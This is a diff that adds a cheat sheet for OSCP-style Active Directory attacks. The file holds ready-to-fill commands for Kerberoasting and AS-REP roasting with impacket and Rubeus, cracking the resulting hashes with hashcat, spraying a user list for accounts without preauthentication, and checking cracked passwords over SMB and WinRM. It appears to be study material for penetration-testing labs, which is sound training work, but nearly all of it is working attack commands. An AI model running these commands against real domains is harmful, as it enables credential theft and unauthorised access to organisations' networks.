@@ -1,0 +1,53 @@
+############################################################
+# ROASTING CHEAT-SHEET  (OSCP+)
+# adenum.ps1 FINDS the targets (#4 Kerberoast, #5 AS-REP);
+# these commands GET the hash and crack it.
+# Fill in: <DC_IP> <DOMAIN> <user> <pass>
+# hashcat modes:  13100 = Kerberoast (TGS)   |   18200 = AS-REP
+############################################################
+
+
+########## KERBEROASTING  (needs any valid domain creds) ##########
+# adenum.ps1 menu #4 -> kerberoastable.txt  (users with an SPN)
+
+# --- from KALI (remote) ---
+impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<user>:'<pass>' -outputfile kerb.hash
+hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt --force
+# request a single account only:
+impacket-GetUserSPNs -request-user <spn_user> -dc-ip <DC_IP> <DOMAIN>/<user>:'<pass>'
+
+# --- on TARGET with Rubeus (uses current logon, no creds typed) ---
+.\Rubeus.exe kerberoast /nowrap /outfile:kerb.hash
+#   then copy kerb.hash back to Kali and hashcat -m 13100
+
+
+########## AS-REP ROASTING  (no creds needed - DONT_REQ_PREAUTH) ##########
+# adenum.ps1 menu #5 -> asrep_roastable.txt  (users with preauth disabled)
+
+# --- from KALI (remote) ---
+# known user:
+impacket-GetNPUsers <DOMAIN>/<user> -no-pass -dc-ip <DC_IP>
+# spray a user list (use users.txt that adenum saved from menu #1):
+impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile asrep.hash <DOMAIN>/ -usersfile users.txt
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force
+
+# --- on TARGET with Rubeus ---
+.\Rubeus.exe asreproast /nowrap /outfile:asrep.hash
+#   then copy asrep.hash back to Kali and hashcat -m 18200
+
+
+########## AFTER YOU CRACK A HASH ##########
+# validate the cred before pivoting:
+nxc smb <DC_IP> -u <user> -p '<cracked_pass>'
+nxc winrm <DC_IP> -u <user> -p '<cracked_pass>'
+# feed the user back into adenum.ps1 #7/#8 to map where it can go
+# (group membership -> nested groups -> reachable hosts).
+
+
+########## NOTES / GOTCHAS ##########
+# - Clock skew > 5 min breaks Kerberos:  sudo ntpdate <DC_IP>  (or  rdate -n <DC_IP>)
+# - Use the FQDN domain (e.g. corp.com), not the NetBIOS short name.
+# - GetUserSPNs needs valid creds; GetNPUsers AS-REP does not.
+# - Quote passwords with special chars in single quotes on Kali.
+# - hashcat: drop --force if it errors on your GPU/CPU setup.
+############################################################
